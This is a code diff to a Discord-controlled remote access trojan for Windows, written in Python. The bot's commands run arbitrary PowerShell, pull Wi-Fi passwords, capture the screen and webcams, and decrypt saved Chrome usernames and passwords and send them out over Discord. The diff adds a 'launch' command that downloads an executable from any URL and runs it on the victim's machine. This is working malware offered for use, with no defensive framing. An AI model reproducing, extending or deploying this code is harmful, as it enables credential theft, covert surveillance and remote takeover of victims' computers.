@@ -17,6 +17,7 @@ import win32crypt
 import subprocess
 import numpy as np
 import winreg as reg
+import urllib.request
 from datetime import datetime
 from Crypto.Cipher import AES
 from discord.ext import commands
@@ -25,7 +26,7 @@ from win32crypt import CryptUnprotectData
 # Constants
 TOKEN = "TOKEN" # Discord bot token
 USERNAME = os.getenv("USERNAME")  # Windows username
-GUILD_ID = 000000000000  # Replace with your actual server ID (Interger)
+GUILD_ID = 0  # Replace with your actual server ID (Interger)
 
 # Vars for bot
 intents = discord.Intents.default()
@@ -160,7 +161,7 @@ async def record_screen(ctx, rec: bool):
 
 @bot.command()
 async def what(ctx):
-    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**webcam_selfie**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**echo**-(make the bot echo you)\n**stopbot**-(You know what this does)"
+    commands = "**whoami**-(get current user who is running at this moment)\n**ps**-(execute powershell commands)\n**getwifipass**-(get wifi passwords)\n**steal**-(Steals saved chrome email and passwords)\n**screen** -(start|stop)\n**cam**-(make a photo of any found webcams)\n**getsysinfo**-(get important system info)\n**echo**-(make the bot echo you)\n**lauch**-(launch programs like this launch https://website_url.com/update.exe customApplicationName.exe)\n**restart**-(restart bot)\n**stopbot**-(You know what this does)"
     await ctx.send(commands)
 
 @bot.command()
@@ -172,9 +173,16 @@ async def echo(ctx, *, message: str):
     await ctx.send(f" {message}")
 
 @bot.command()
-async def webcam_selfie(ctx):
-    for i in range(0,10):
-        print(i)
+async def cam(ctx):
+    webcams = []
+    for camID in range(0,10):
+        cam = cv2.VideoCapture(camID)
+        if cam.isOpened():
+            webcams.append(cam)
+            print(f"webcam {cam} has been found!")
+            cam.release()
+        else:
+            print(f"webcam {cam} was not found")
         
 
 @bot.command()
@@ -206,8 +214,48 @@ async def ps(ctx, *, code: str):
         await ctx.send(f"❌ Error executing PowerShell command: {str(e)}")
 
 @bot.command()
+async def launch(ctx, url: str, name: str = None):
+    try:
+        if url is None or name is None:
+            await ctx.send("Please use the following format: !launch https://example.com/update.exe newfilename.exe")
+        else:
+            await ctx.send(f"Starting launcher!\download url: {url}\nApplication name: {name}")
+            urllib.request.urlretrieve(url, name)
+            await ctx.send(f"✅ Download complete!")
+            process = await asyncio.create_subprocess_exec(name, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            await ctx.send(f"✅ Starting Process!")
+            # Capture output and error
+            stdout, stderr = await process.communicate()
+            output = stdout.decode('utf-8').strip()
+            error = stderr.decode('utf-8').strip()
+            if output:
+                result_message = f"**👻 Output:**\n{output}"
+            elif error:
+                result_message = f"**❌ Error:**\n{error}"
+            else:
+                result_message = "❌ No output or error from the update process."
+            await ctx.send(result_message)
+        
+    except Exception as e:
+        print(e)
+        await ctx.send(f"❌ error: {e}")
+
+@bot.command()
+async def restart(ctx):
+    py = sys.executable
+    process = sys.argv[0]
+    await ctx.send(f"✅ restarting {process}")
+
+    if process.endswith('.exe'):
+        subprocess.Popen([process])
+    else:
+        subprocess.Popen([py, process])
+
+    sys.exit()
+
+@bot.command()
 async def stopbot(ctx):
-    await ctx.send("❌Shutting down the bot...")
+    await ctx.send("❌ Shutting down the bot...")
     await bot.close()
 
 @bot.command()
@@ -244,17 +292,17 @@ async def steal(ctx):
         if password_value:
             decrypted_password = decrypt_password(password_value)
             if decrypted_password:
-                await ctx.send(f"✅URL: {origin_url}")
-                await ctx.send(f"✅Username: {username_value}")
-                await ctx.send(f"✅Password: {decrypted_password}")
+                await ctx.send(f"✅ URL: {origin_url}")
+                await ctx.send(f"✅ Username: {username_value}")
+                await ctx.send(f"✅ Password: {decrypted_password}")
             else:
-                await ctx.send(f"❌URL: {origin_url}")
-                await ctx.send(f"❌Username: {username_value}")
-                await ctx.send(f"❌Password: Unable to decrypt: {password_value}")
+                await ctx.send(f"❌ URL: {origin_url}")
+                await ctx.send(f"❌ Username: {username_value}")
+                await ctx.send(f"❌ Password: Unable to decrypt: {password_value}")
         else:
-            await ctx.send(f"❌URL: {origin_url}")
-            await ctx.send(f"❌Username: {username_value}")
-            await ctx.send(f"❌Password: [Encrypted]: {password_value}")
+            await ctx.send(f"❌ URL: {origin_url}")
+            await ctx.send(f"❌ Username: {username_value}")
+            await ctx.send(f"❌ Password: [Encrypted]: {password_value}")
 
     conn.close()
     os.remove(temp_db_path)
